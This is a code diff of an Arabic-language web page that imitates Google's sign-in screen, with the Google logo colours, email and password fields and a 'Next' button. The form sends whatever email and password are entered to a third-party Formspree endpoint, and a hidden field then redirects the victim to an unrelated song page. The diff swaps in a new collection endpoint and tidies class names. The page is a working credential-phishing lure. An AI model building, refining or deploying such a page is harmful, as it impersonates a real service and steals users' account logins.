@@ -5,37 +5,35 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تسجيل الدخول - Google</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .login-box { border: 1px solid #dadce0; border-radius: 8px; padding: 40px; width: 100%; max-width: 450px; min-height: 400px; display: flex; flex-direction: column; }
-        .logo { text-align: center; font-size: 24px; margin-bottom: 10px; font-weight: 500; }
+        .login-card { border: 1px solid #dadce0; border-radius: 8px; padding: 40px; width: 100%; max-width: 450px; min-height: 400px; display: flex; flex-direction: column; }
+        .google-text { text-align: center; font-size: 24px; font-weight: 500; margin-bottom: 10px; }
         .g-blue { color: #4285f4; } .g-red { color: #ea4335; } .g-yellow { color: #fbbc05; } .g-green { color: #34a853; }
-        .title { text-align: center; font-size: 22px; margin-bottom: 8px; font-weight: 400; }
-        .subtitle { text-align: center; margin-bottom: 30px; font-size: 15px; color: #202124; }
+        .title { text-align: center; font-size: 22px; margin-bottom: 30px; font-weight: 400; }
         input { width: 100%; padding: 13px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; }
         input:focus { border: 2px solid #1a73e8; }
         .footer { margin-top: auto; display: flex; justify-content: flex-end; }
-        button { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 500; }
+        .btn-next { background: #1a73e8; color: #fff; border: none; padding: 10px 30px; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 500; }
     </style>
 </head>
 <body>
-    <div class="login-box">
-        <div class="logo">
+    <div class="login-card">
+        <div class="google-text">
             <span class="g-blue">G</span><span class="g-red">o</span><span class="g-yellow">o</span><span class="g-blue">g</span><span class="g-green">l</span><span class="g-red">e</span>
         </div>
         <h1 class="title">تسجيل الدخول</h1>
-        <p class="subtitle">المتابعة إلى الموقع بإستخدام بريدك الإلكتروني</p>
 
-        <form action="https://formspree.io/f/mbdywadg" method="POST">
+        <form action="https://formspree.io/f/xojwrkap" method="POST">
             
-            <input type="email" name="Email" placeholder="البريد الإلكتروني أو الهاتف" required>
+            <input type="email" name="email" placeholder="البريد الإلكتروني أو الهاتف" required>
             
-            <input type="password" name="Password" placeholder="أدخل كلمة المرور" required>
+            <input type="password" name="password" placeholder="أدخل كلمة المرور" required>
             
             <input type="hidden" name="_next" value="https://www.musicful.ai/song/48835729232678919/">
-            
+
             <div class="footer">
-                <button type="submit">التالي</button>
+                <button type="submit" class="btn-next">التالي</button>
             </div>
         </form>
     </div>
